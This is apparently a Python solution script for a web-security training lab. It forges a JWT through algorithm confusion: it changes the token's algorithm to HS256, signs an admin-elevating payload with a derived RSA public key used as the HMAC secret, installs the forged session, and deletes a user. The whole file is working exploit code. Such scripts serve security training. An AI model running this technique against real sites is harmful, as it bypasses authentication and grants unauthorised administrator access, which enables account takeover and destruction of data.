import argparse
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from common import become_admin_payload, delete_carlos, get_session_token, lab_session, load_public_key_bytes, set_session, sign_hs256


parser = argparse.ArgumentParser(add_help=False)
parser.add_argument("--derived-public-key", required=True, help="PEM public key path derived with jwt_forgery.py")
known, remaining = parser.parse_known_args()
sys.argv = [sys.argv[0]] + remaining

lab = lab_session("JWT authentication bypass via algorithm confusion with no exposed key")
lab.login("wiener", "peter")

header, payload = become_admin_payload(get_session_token(lab))
header["alg"] = "HS256"
header.pop("jwk", None)
header.pop("jku", None)
forged = sign_hs256(header, payload, load_public_key_bytes(known.derived_public_key))

set_session(lab, forged)
delete_carlos(lab)
